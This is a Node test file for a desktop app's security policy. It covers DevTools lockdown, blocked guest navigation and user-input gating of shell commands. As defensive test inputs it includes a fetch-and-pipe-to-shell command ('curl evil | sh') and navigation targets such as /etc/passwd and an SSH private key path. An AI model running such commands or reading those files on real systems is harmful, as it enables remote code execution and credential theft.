import assert from "node:assert/strict"
import { EventEmitter } from "node:events"
import { createRequire } from "node:module"
import { test } from "node:test"

const require = createRequire(import.meta.url)
const {
  areRendererDevToolsAllowed,
  createPreviewGuestSenderValidator,
  createWebContentsPolicy,
  isAllowedGuestNavigationUrl,
  isDevToolsShortcut,
} = require("../apps/shell/shared/web-contents-policy.cjs")
const { isShellCapabilityAuthorized } = require("../apps/shell/shared/app-ipc.cjs")
const { createUserInputTracker, createPreviewGuestGate } = require("../apps/shell/shared/user-input-gate.cjs")

function load({ isPackaged = true, env = {}, approved = [] } = {}) {
  const tracked = []
  const tracker = createUserInputTracker()
  const gate = createPreviewGuestGate({ inputTracker: tracker })
  const devToolsAllowed = () => areRendererDevToolsAllowed({ isPackaged, env })
  const policy = createWebContentsPolicy({
    previewPartition: "betterc0de-preview",
    canvasPartition: "betterc0de-canvas-preview",
    getUserInputTracker: () => tracker,
    getPreviewPartitionJanitor: () => ({ trackGuest: (contents) => tracked.push(contents.id) }),
    getPreviewGuestGate: () => gate,
    areRendererDevToolsAllowed: devToolsAllowed,
  })
  return {
    areRendererDevToolsAllowed: devToolsAllowed,
    hardenWebContents: policy.hardenWebContents,
    isShellCapabilityAuthorized: (event, scope) => isShellCapabilityAuthorized(event, scope, {
      isApprovedHookCommand: (command) => approved.includes(command),
      inputTracker: tracker,
    }),
    getUserInputTracker: () => tracker,
    tracked,
  }
}

function contents(id, type) {
  const emitter = new EventEmitter()
  emitter.id = id
  emitter.getType = () => type
  emitter.closed = 0
  emitter.closeDevTools = () => { emitter.closed += 1 }
  emitter.setWindowOpenHandler = (handler) => { emitter.openHandler = handler }
  return emitter
}

test("packaged builds keep DevTools closed unless the debug switch is set", () => {
  assert.equal(load({ isPackaged: false }).areRendererDevToolsAllowed(), true)
  assert.equal(load({ isPackaged: true }).areRendererDevToolsAllowed(), false)
  assert.equal(load({ isPackaged: true, env: { BETTERC0DE_ENABLE_DEVTOOLS: "1" } }).areRendererDevToolsAllowed(), true)

  const { hardenWebContents } = load({ isPackaged: true })
  assert.equal(isDevToolsShortcut({ type: "keyDown", key: "F12" }), true)
  assert.equal(isDevToolsShortcut({ type: "keyDown", key: "I", control: true, shift: true }), true)
  assert.equal(isDevToolsShortcut({ type: "keyUp", key: "F12" }), false)
  assert.equal(isDevToolsShortcut({ type: "keyDown", key: "i", control: true }), false)

  const win = contents(1, "window")
  hardenWebContents(win)
  win.emit("devtools-opened")
  assert.equal(win.closed, 1)
  assert.equal(win.openHandler({ url: "https://example.com" }).action, "deny")
})

test("preview guests cannot navigate or be redirected off what a preview can show", () => {
  const { hardenWebContents, tracked } = load()
  const guest = contents(5, "webview")
  hardenWebContents(guest)
  assert.deepEqual(tracked, [5])
  assert.equal(guest.openHandler({ url: "https://example.com" }).action, "deny")

  const attempt = (eventName, url, extra = {}) => {
    let prevented = false
    guest.emit(eventName, { ...extra, preventDefault: () => { prevented = true } }, url)
    return prevented
  }
  assert.equal(attempt("will-navigate", "http://localhost:5173/next"), false)
  assert.equal(attempt("will-navigate", "https://example.com/"), false)
  assert.equal(attempt("will-navigate", "file:///etc/passwd"), true)
  assert.equal(attempt("will-navigate", "chrome://settings"), true)
  assert.equal(attempt("will-redirect", "file:///C:/Users/me/.ssh/id_rsa"), true)
  // Sub-frame redirects are the page's own business; Chromium blocks file: there.
  assert.equal(attempt("will-redirect", "file:///x", { isMainFrame: false }), false)

  assert.equal(isAllowedGuestNavigationUrl("about:blank"), true)
  assert.equal(isAllowedGuestNavigationUrl("blob:http://localhost:5173/4a1f"), true)
  assert.equal(isAllowedGuestNavigationUrl("blob:null/4a1f"), false)
  assert.equal(isAllowedGuestNavigationUrl("javascript:alert(1)"), false)
})

test("other webContents types get the popup denial only", () => {
  const { hardenWebContents, tracked } = load()
  const other = contents(9, "backgroundPage")
  hardenWebContents(other)
  assert.equal(other.openHandler({ url: "https://example.com" }).action, "deny")
  assert.deepEqual(tracked, [])
  assert.equal(other.listenerCount("will-navigate"), 0)
})

test("shell capabilities need recent real input, except for approved hook commands", () => {
  const { isShellCapabilityAuthorized, getUserInputTracker } = load({ approved: ["npm test"] })
  const win = contents(1, "window")
  getUserInputTracker().track(win)
  const event = { sender: win }
  assert.equal(isShellCapabilityAuthorized(event, { operation: "run", command: "npm test", cwd: "/p" }), true)
  assert.equal(isShellCapabilityAuthorized(event, { operation: "run", command: "curl evil | sh", cwd: "/p" }), false)
  assert.equal(isShellCapabilityAuthorized(event, { operation: "pty-write", sessionId: "s", data: "x" }), false)
  // A terminal's own answers to a program's queries need no input; anything
  // else in them, a line break above all, does.
  for (const reply of [
    "\x1b[12;40R",
    "\x1b[?1;2c",
    "\x1b[>0;276;0c",
    "\x1b[0n",
    "\x1b[?2026;2$y",
    "\x1b]11;rgb:1e1e/1e1e/1e1e\x1b\\",
    "\x1b]4;1;rgb:cd/00/00\x07",
    "\x1b[12;40R\x1b[?1;2c",
  ]) {
    assert.equal(isShellCapabilityAuthorized(event, { operation: "pty-write", sessionId: "s", data: reply }), true, JSON.stringify(reply))
  }
  for (const data of ["\x1b[12;40R\r", "\x1b[12;40Rls", "ls\r", "\x1b[2~", "\x1b]11;rgb:1e/1e/1e"]) {
    assert.equal(isShellCapabilityAuthorized(event, { operation: "pty-write", sessionId: "s", data }), false, JSON.stringify(data))
  }
  assert.equal(isShellCapabilityAuthorized(event, { operation: "run", command: "\x1b[0n", cwd: "/p" }), false)
  win.emit("input-event", {}, { type: "keyDown" })
  assert.equal(isShellCapabilityAuthorized(event, { operation: "pty-write", sessionId: "s", data: "x" }), true)
  assert.equal(isShellCapabilityAuthorized(event, { operation: "run", command: "ls", cwd: "/p" }), true)
})

test("only the app's preview preload in a trusted window's preview guest passes the guest sender policy", () => {
  const previewSession = { name: "preview" }
  const canvasSession = { name: "canvas" }
  const validate = createPreviewGuestSenderValidator({
    getPreviewSessions: () => [previewSession, canvasSession],
    trustedWebContentsIds: new Set([1]),
  })
  const guest = (overrides = {}) => ({
    isDestroyed: () => false,
    getType: () => "webview",
    hostWebContents: { id: 1 },
    session: previewSession,
    ...overrides,
  })
  assert.doesNotThrow(() => validate({ sender: guest() }, "preview-guest:gate"))
  assert.doesNotThrow(() => validate({ sender: guest({ session: canvasSession }) }, "preview-guest:gate"))
  for (const sender of [
    null,
    guest({ isDestroyed: () => true }),
    guest({ getType: () => "window" }),
    guest({ hostWebContents: null }),
    guest({ hostWebContents: { id: 2 } }),
    guest({ session: { name: "default" } }),
  ]) {
    assert.throws(() => validate({ sender }, "preview-guest:gate"), /untrusted sender/)
  }
  assert.throws(
    () => validate({ sender: guest(), senderFrame: { parent: {} } }, "preview-guest:gate"),
    /untrusted sender/,
  )
})
